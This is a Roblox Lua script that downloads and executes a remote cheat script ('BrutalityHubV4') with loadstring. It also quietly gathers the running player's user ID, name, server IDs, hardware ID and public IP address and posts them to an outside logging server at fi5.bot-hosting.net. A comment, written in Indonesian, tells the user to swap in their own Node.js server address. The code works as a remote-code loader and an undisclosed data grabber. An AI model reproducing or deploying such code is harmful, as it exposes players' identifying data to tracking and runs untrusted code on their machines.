local http = game:GetService("HttpService")

-- Load and execute BrutalityHubV4.lua script
local function loadBrutalityHub()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Botuna/main/BrutalityHubV4.lua"))()
end

local function sendPlayerData()
    local LocalPlayer = game.Players.LocalPlayer
    local userId = LocalPlayer.UserId
    local playerName = LocalPlayer.Name
    local placeId = game.PlaceId
    local jobId = game.JobId
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    local ip = tostring(game:HttpGet("https://api.ipify.org", true))

    local data = {
        userId = userId,
        playerName = playerName,
        placeId = placeId,
        jobId = jobId,
        hwid = hwid,
        ip = ip
    }

    -- Ganti URL dengan alamat server Node.js Anda
    local url = "http://fi5.bot-hosting.net:3000/log"

    local jsonData = http:JSONEncode(data)

    http:PostAsync(url, jsonData, Enum.HttpContentType.ApplicationJson)
end

-- Load the BrutalityHub script and send player data
loadBrutalityHub()
sendPlayerData()
